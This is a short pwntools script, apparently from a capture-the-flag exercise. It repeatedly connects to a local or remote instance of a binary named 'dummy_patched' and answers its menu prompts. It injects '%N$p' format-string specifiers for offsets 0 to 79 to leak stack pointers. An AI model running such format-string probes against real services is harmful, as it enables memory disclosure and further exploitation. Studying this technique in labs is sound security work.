from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())


exe = './dummy_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'
warnings.filterwarnings("ignore")

for i in range(0,80):
    try:
        p = start()
        p.recvuntil('Pick(in all honestly):')
        p.sendline('2')
        p.recvuntil('pointers:')
        p.sendline('%{}$p'.format(i).encode())
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
